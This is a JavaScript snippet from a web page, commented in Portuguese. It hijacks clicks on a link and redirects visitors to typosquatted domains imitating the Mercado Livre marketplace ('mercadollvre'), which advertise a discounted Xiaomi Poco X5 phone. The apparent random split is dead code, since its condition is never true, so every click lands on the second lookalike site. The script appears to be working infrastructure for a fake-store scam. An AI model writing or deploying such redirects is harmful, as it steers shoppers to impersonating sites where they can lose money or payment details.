<script>
  document.addEventListener('DOMContentLoaded', function() {
    // Função para redirecionar com base na porcentagem
    function redirectBasedOnPercentage(event) {
      event.preventDefault(); // Evita o comportamento padrão de navegação

      const percentage = Math.random() * 100;

      if (percentage < 0) {
        window.location.href = "https://www.mercadollvredesconto.online/products/xiaomi-pocophone-poco-x5-5g-dual-sim-256-gb-8-gb-ram";
      } else {
        window.location.href = "https://ofertamercadollvre.online/products/xiaomi-pocophone-poco-x5-5g-dual-sim-256-gb-8-gb-ram";
      }
    }

    // Adiciona o evento de clique ao link
    var redirectLink = document.getElementById('redirectLink');
    if (redirectLink) {
      redirectLink.addEventListener('click', redirectBasedOnPercentage);
    }
  });
</script>
